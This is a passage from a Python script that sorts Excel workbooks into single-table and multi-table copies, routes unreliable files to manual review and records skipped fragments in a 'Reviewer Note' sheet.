                # row (a total count) instead of one row per fragment -- the
                # per-fragment detail this sheet would otherwise get (see the
                # `if unmatched:` branch below) isn't the point here; the
                # point is that there were too many of them to trust.
                max_row, max_col = _true_sheet_extent(ws)
                region = (1, max_row or 1, 1, max_col or 1)
                skipped_per_sheet[sheet_name] = [(
                    region,
                    f"{len(unmatched)} skipped fragment(s) on this sheet",
                    TOO_MANY_FRAGMENTS_SHEET_REASON,
                )]
                tables_per_sheet[sheet_name] = []
                log_fn(
                    f"    {sheet_name:<28} : not parsed (too many skipped fragments: "
                    f"{len(unmatched)})"
                )
                continue

            tables_per_sheet[sheet_name] = tables
            if context_by_table:
                context_per_sheet[sheet_name] = {
                    table: "; ".join(_fragment_preview(ws, frag, max_len=None) for frag in frags)
                    for table, frags in context_by_table.items()
                }
            if unmatched:
                # max_len=None -- an unmatched fragment (e.g. a trailing
                # footnote after the last table) has nowhere else to go: its
                # source sheet is about to be replaced/removed by
                # rebuild_workbook below (see the comment above), so this
                # Reviewer Note row is the ONLY surviving record of its
                # content. The default max_len=60 truncation (fine for the
                # matched-as-context path, which already keeps max_len=None
                # for the same reason) would otherwise permanently cut off a
                # signature block or footnote with no way to recover it.
                skipped_per_sheet[sheet_name] = [
                    (region, _fragment_preview(ws, region, max_len=None), TOO_SMALL_REASON)
                    for region in unmatched
                ]
            elif not tables:
                # Genuinely nothing here at all -- no real table, and not
                # even a too-small fragment to report (detect_tables' own
                # (0, 0) extent case, or a sheet with formatting but zero
                # actual values). Still needs its own Reviewer Note row: this
                # sheet is about to be REMOVED from the output entirely (see
                # _rebuild_sheet), and without an explicit row here a reviewer
                # would have no way to tell "this sheet had content that
                # couldn't be parsed" apart from "this sheet never existed in
                # the source file at all."
                max_row, max_col = _true_sheet_extent(ws)
                region = (1, max_row or 1, 1, max_col or 1)
                skipped_per_sheet[sheet_name] = [(region, "No data detected on this sheet", BLANK_SHEET_REASON)]

            matched_count = len(skipped) - len(unmatched)
            note_bits = []
            if unmatched:
                note_bits.append(f"{len(unmatched)} skipped fragment(s)")
            if matched_count:
                note_bits.append(f"{matched_count} matched as table context")
            note = f", {', '.join(note_bits)}" if note_bits else ""
            log_fn(f"    {sheet_name:<28} : {len(tables)} table(s){note}")

        overloaded_sheets = {
            name: len(tables) for name, tables in tables_per_sheet.items()
            if len(tables) > MAX_TABLES_PER_SHEET
        }
        if overloaded_sheets:
            # A sheet producing this many tables is more likely a
            # detect_tables misfire than a genuine multi-table sheet -- see
            # MAX_TABLES_PER_SHEET's own comment. The WHOLE file is rejected
            # here (before rebuild_workbook/save ever run), even though some
            # other sheet in it may have parsed perfectly cleanly, since a
            # detection failure this size is reason enough to distrust the
            # rest of this run's output too, not just the offending sheet's.
            wb.close()
            detail = ", ".join(f"{name} ({count} tables)" for name, count in overloaded_sheets.items())
            note = (
                f"Sheet(s) produced more than {MAX_TABLES_PER_SHEET} table(s) each -- likely "
                f"a parsing mistake rather than genuine multi-table content: {detail}"
            )
            log_fn(
                f"  -> too many tables detected on a single sheet ({detail}): sending for "
                "manual review (original left in place)"
            )
            return ProcessResult(status="no_tables", tables_found=0, note=note)

        if total_unmatched_fragments > MAX_SKIPPED_FRAGMENTS_PER_FILE:
            # This many unmatched skipped fragments, summed across every
            # sheet in the workbook, is treated as a sign the WHOLE file is
            # too unreliable to parse -- overriding even a real table found
            # on some other, cleaner sheet in the same workbook (that table's
            # region is already sitting in tables_per_sheet by this point,
            # but it's discarded here right along with everything else,
            # exactly the way total_tables == 0 below discards nothing
            # because there was never anything to discard). Closed and
            # returned here, before rebuild_workbook/save ever run, same
            # early-exit shape as the total_tables == 0 branch below -- see
            # that branch's own docstring for why the ORIGINAL, untouched
            # file is what triage_pipeline.py's stage2_process_excels sends
            # to manual review for any non-"single"/"multi" status, not a
            # partially-rebuilt copy.
            wb.close()
            note = (
                f"{total_unmatched_fragments} skipped fragment(s) across the workbook -- "
                f"exceeds the {MAX_SKIPPED_FRAGMENTS_PER_FILE}-fragment ceiling, too "
                "unreliable to parse"
            )
            log_fn(
                f"  -> too many skipped fragments across the workbook "
                f"({total_unmatched_fragments}): sending for manual review (original left in place)"
            )
            return ProcessResult(status="no_tables", tables_found=0, note=note)

        total_tables = sum(len(t) for t in tables_per_sheet.values())
        if total_tables == 0:
            # No sheet in this workbook contributed a real table -- every
            # sheet's content is either too small a fragment (MIN_TABLE_ROWS),
            # or the whole sheet was never even run through detect_tables
            # because it contains a merged cell and/or an image (see this
            # loop's own gate above), e.g. a workbook that's entirely
            # narrative/merged-cell text, or a scanned image, with no actual
            # grid data anywhere. Closed and returned here, before rebuild_workbook/
            # _write_skipped_fragments_sheet/save ever run, since there's
            # nothing to rebuild and no modified copy worth producing -- this
            # file is sent for manual review as-is (see triage_pipeline.py's
            # stage2_process_excels, which copies the untouched original into
            # its manual-review folder for any non-"single"/"multi" status),
            # not saved into single_dir the way a same-shaped but genuinely
            # tabular file would be.
            wb.close()
            total_skipped = sum(len(v) for v in skipped_per_sheet.values())
            note = (
                f"No real table detected on any sheet ({total_skipped} skipped "
                "fragment(s)/unparsed sheet(s) (merged cells or images) found instead)"
                if total_skipped else "No real table detected on any sheet"
            )
            log_fn("  -> no tables found: sending for manual review (original left in place)")
            return ProcessResult(status="no_tables", tables_found=0, note=note)

        file_is_multi = any(len(t) > 1 for t in tables_per_sheet.values())
        rebuild_workbook(wb, tables_per_sheet, context_per_sheet, external_headers_per_sheet)
        # Built fresh from wb.sheetnames rather than reusing rebuild_workbook's
        # own internal set -- that one is scoped to its own call and never
        # returned, but it's already fully reflected in wb.sheetnames by the
        # time rebuild_workbook returns, so a fresh read here sees the same
        # names at no extra cost (this runs once per file, not once per table).
        _write_skipped_fragments_sheet(wb, skipped_per_sheet, set(wb.sheetnames))

        total_skipped = sum(len(v) for v in skipped_per_sheet.values())
        file_note = (
            f"{total_skipped} skipped fragment(s) -- see 'Reviewer Note' sheet"
            if total_skipped else ""
        )

        # Every output is saved via openpyxl now (so the "Detected via" note
        # can be written), rather than moving a single-table file's original
        # bytes as-is -- so the destination is always .xlsx, even for a
        # .xls/.xlsb/.csv input. The original file is always left in place,
        # untouched, at its source location.
        dest_dir = modified_dir if file_is_multi else single_dir
        dest_name = path.stem + ".xlsx"
        dest = _unique_dest(dest_dir, dest_name)
        wb.save(dest)
        wb.close()
        kind = "multi-table" if file_is_multi else "single-table"
        log_fn(f"  -> {kind}: modified copy saved to "
               f"'{dest_dir.name}/{dest.name}' (original left in place)")
        return ProcessResult(
            status="multi" if file_is_multi else "single",
            tables_found=total_tables,
            note=file_note,
            dest=dest,
        )
    except Exception as exc:
        try:
            wb.close()
        except Exception:
            pass
        log_fn(f"  SKIPPED (error while processing): {exc}")
        return ProcessResult(status="error", error=str(exc))


def run(folder: Path, log_fn=print) -> None:
    single_dir = folder / SINGLE_DIRNAME
    modified_dir = folder / MODIFIED_DIRNAME
    single_dir.mkdir(exist_ok=True)
    modified_dir.mkdir(exist_ok=True)

    files = collect_input_files(folder)
    n_single = n_multi = n_skipped = 0
    try:
        for idx, path in enumerate(files, 1):
            log_fn(f"\n[{idx}/{len(files)}] {path.name}")
            # temp_base_dir=folder: standalone runs have no separate
            # "approved output folder" the way triage_pipeline.py does --
            # `folder` (the caller's own input/output location) is the
            # closest equivalent, so a disposable recalculated copy (see
            # _fill_blank_formula_values) still lands somewhere the caller
            # already chose rather than the OS temp dir.
            status = process_file(
                path, single_dir, modified_dir, log_fn=log_fn, temp_base_dir=folder
            ).status
            if status == "single":
                n_single += 1
            elif status == "multi":
                n_multi += 1
            else:
                n_skipped += 1
    finally:
        # Quits the shared hidden Excel instance _fill_blank_formula_values
        # may have started for this batch (see close_excel_app) -- a no-op
        # if it was never needed. In `finally` so a mid-batch error still
        # doesn't leave an orphan EXCEL.EXE process running.
        close_excel_app()

    log_fn(f"\nSUMMARY: {len(files)} file(s) scanned - "
           f"{n_single} single-table (modified copy in '{SINGLE_DIRNAME}/', "
           f"original left in place), "
           f"{n_multi} multi-table (modified copy in '{MODIFIED_DIRNAME}/', "
           f"original left in place), {n_skipped} skipped.")


def _pick_folder(initial_dir: str) -> Optional[Path]:
    try:
        import tkinter as tk
        from tkinter import filedialog
    except ImportError:
        return None
    root = None
    try:
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        folder = filedialog.askdirectory(
            initialdir=initial_dir, title="Select folder of Excel files to sort")
    finally:
        if root is not None:
            root.destroy()
    return Path(folder) if folder else None


def main(argv: Optional[list[str]] = None) -> int:
    parser = argparse.ArgumentParser(
        description="Sort Excel workbooks into single-table vs multi-table, "
                    "renaming every sheet to one table per sheet with a "
                    "'Detected via' note in A1, in a copy of the file.")
    parser.add_argument("folder", nargs="?", default=None,
                        help="Folder of Excel files to sort (top level only). "
                             "If omitted, a folder-picker dialog opens.")
    args = parser.parse_args(argv)

    if args.folder:
        folder = Path(args.folder)
    else:
        picked = _pick_folder(str(Path(__file__).resolve().parent))
        if picked is None:
            print("ERROR: no folder given and the folder-picker is unavailable "
                  "(tkinter missing). Pass a folder path as an argument.",
                  file=sys.stderr)
            return 2
        folder = picked

    if not folder.is_dir():
        print(f"ERROR: not a folder: {folder}", file=sys.stderr)
        return 2

    run(folder)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
